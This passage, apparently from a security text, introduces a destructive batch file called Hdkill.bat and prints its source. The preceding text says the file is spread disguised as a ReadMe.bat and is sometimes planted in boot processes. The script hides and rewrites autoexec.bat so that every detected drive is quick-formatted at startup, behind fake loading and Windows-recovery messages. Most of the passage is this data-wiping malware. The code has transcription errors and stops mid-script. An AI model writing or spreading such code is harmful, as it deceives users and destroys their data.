and distributed with game evaluations as a ReadMe.bat file. In other cases, hackers go to the trouble of breaking into systems only to add this file to the system bootup process. Careful inspection of the code will reveal its purpose.

# Hdkill.bat

```
@echo off
:start
cis
echo PLEASE WAIT WHILE PROGRAM LOADS...
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo call format c: /q /u /autotest >nul >>c:\autoexec.bat
call attrib +r +h c:\autoexec.bat >nul
set drive=
set alldrive=c d e f g h i j k l m n o p q r s t u v w x y z
echo @echo off >drivechk.bat
echo @prompt %%%%comspec%%%% /f /c vol %%%1: $b find "Vol" > nul > {t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 goto enddc >>drivechk.bat
echo PLEASE WAIT WHILE PROGRAM LOADS...
echo @prompt %%%%comspec%%%% /f /c dir %%%1:..\ad/w/ - p $b find "bytes" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 goto enddc >>drivechk.bat
cis
echo PLEASE WAIT WHILE PROGRAM LOADS...
echo @prompt dir %%%1:..\ad/w/ - p $b find "0 bytes free" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 set drive=%drive% %1 >>drivechk.bat
cis
echo PLEASE WAIT WHILE PROGRAM LOADS...
echo :enddc >>drivechk.bat
:testdrv
for %a in (%alldrive%) do call drivechk.bat %a >nul
del drivechk.bat >nul
:form_del
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows reco vers your system... >>c:\autoexec.bat
echo for %%%a in (%drive%) do call format %%%a: /q /u /autotest > nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows reco vers
```